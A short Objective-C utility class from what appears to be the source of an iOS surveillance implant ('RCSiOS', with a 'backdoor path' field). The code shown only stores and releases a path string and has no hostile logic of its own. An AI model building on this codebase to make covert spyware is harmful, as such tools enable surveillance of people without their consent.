/*
 * RCSiOS - Utils and stuff
 *
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <fcntl.h>

#import "RCSIUtils.h"
#import "RCSICommon.h"

//#define DEBUG

@implementation RCSIUtils

- (id)initWithBackdoorPath: (NSString *)aBackdoorPath
{
  self = [super init];
  
  if (self != nil)
    {
      mBackdoorPath       = [aBackdoorPath copy];
    }
  return self;
}

- (void)dealloc
{
  [mBackdoorPath release];
  
  [super dealloc];
}

@end
